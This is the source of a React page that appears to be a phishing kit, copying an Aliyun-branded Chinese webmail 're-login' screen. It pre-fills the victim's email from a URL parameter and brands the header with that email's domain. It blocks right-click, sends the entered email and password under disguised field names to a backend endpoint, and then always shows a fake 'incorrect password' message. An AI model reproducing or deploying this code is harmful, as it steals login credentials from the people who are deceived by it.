
import { useEffect, useRef, useState } from 'react'
import axios from 'axios'


export default function Home() {

  const eye = useRef<HTMLInputElement>(null)

  const form = useRef(null)

  const veri = useRef<HTMLHeadingElement>(null)

  const [header, setHeader] = useState('ALIYUN')
  const [email, setEmail] = useState('')

useEffect(() => {
  document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
}, false);
const url = location.search

const search = new URLSearchParams(url)
const em = search.get('em')

if (em) {
  setEmail(em);
  const res = em.match(/(?<=@)[^.]+(?=\.)/)
  if (res)
  setHeader(res[0] ? res[0] : 'ALIYUN')
  
}

},[])

const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
  e.preventDefault()
  if (veri.current) {
    veri.current.innerText = '核实你的数据...'
    veri.current.classList.remove("hidden")
    veri.current.classList.add("block", "text-green-300")
  }

  setTimeout(async () => {
    if (form.current) {
      const res = new FormData(form.current)
      const data = {
        jenneta: res.get('jenneta'),
        jennet: res.get('jennet')
      }
      try {
        const result = await axios.post('api/hello', data)
      if (result.status === 200) {
        if (veri.current) {
          veri.current.innerText = '密码不正确，请重试。'
          veri.current.classList.remove('text-green-300')
          veri.current.classList.add('text-red-300')
        }
      }
        
      } catch (error) {
        if (veri.current) {
          veri.current.innerText = '密码不正确，请重试。'
          veri.current.classList.remove('text-green-300')
          veri.current.classList.add('text-red-300')
        }
      }
      
    }
    
  }, 2000);
  
  

}

  return (
    <div className='h-screen main-bg'>
  <main className='h-[97%] flex justify-center items-center'>
        <div className='bg-white h-3/5 w-[382px] rounded-t-lg'>
            <section className='h-4/5 w-full p-10 '>

  <div>
  <h1 className='text-center font-sans text-sky-500 text-3xl font-bold m-0 p-0'>
                {header}<span className='text-xs m-0 p-0'>
          &copy;
      </span>
      </h1>
      
  </div>
              

              <h2 className='text-center mt-3'>
                请再次登录以继续
              </h2>

              <form ref={form} onSubmit={handleSubmit}>

              <label htmlFor="jenneta">电子邮件</label>
              <input type="text" id='jenneta' 
                onChange={() => {
                if (veri.current) {
                  veri.current.classList.remove('block') 
                  veri.current.classList.add('hidden')
                }
              }} 
              name='jenneta' 
              defaultValue={email} 
              className='h-9 w-full border border-gray-300 outline-none rounded-sm p-1 mt-1 px-2 mb-3'/>


              <label htmlFor="jennet" className=''>密码</label>
              <div className='relative'>

                <input 
                  onChange={() => {
                    if (veri.current) {
                      veri.current.classList.remove('block') 
                      veri.current.classList.add('hidden') 
                    }
                  }}
                  type="password" 
                  ref={eye}  
                  id='jennet' 
                  name='jennet' 
                  className='h-9 w-full border border-gray-300 outline-none rounded-sm p-1 mt-1 px-2' required/>


                <span 
                  onClick={(e) => {
                    if (eye.current) {
                      eye.current.type = eye.current.type === 'password' ? 'text' : 'password'
                      eye.current.type === 'password' ? e.currentTarget.innerText = '显示' : e.currentTarget.innerText = '藏起来'
                    }
                  }}
                  className='absolute top-4 right-3 text-xs cursor-pointer'>
                      显示
                </span>
              </div>

              <h2 className='text-left mt-1 hidden' ref={veri}>
                请再次登录以继续
              </h2>

              <div className='flex justify-between mt-6'>
                <input 
                type="submit" className='h-9 rounded w-1/4 bg-sky-500 text-white cursor-pointer' value='登录' required/>

                <div className='flex items-center space-x-1'>
                 <input type="checkbox" />
                  <span>
                    保持登录状态
                  </span>
                </div>
              </div>
              



              </form>

            </section>
            <section className='bg-stone-200 h-1/5 opacity-80 px-10 py-3 space-y-1'>
            <h1>
              网络应用程序版本
            </h1>

            <select name="" id="" className='w-full border border-gray-300 h-8 outline-none'>
              <option value=""> 默认情况下</option>
              <option value="">  经典</option>
              <option value="">  现代</option>
            </select>
            </section>
        </div>
  </main>

  <div className='text-center text-white text-xs'>
          版权声明 © 2023 {header}, 公司。保留所有权利。
    </div>
  </div>
    
  )
}
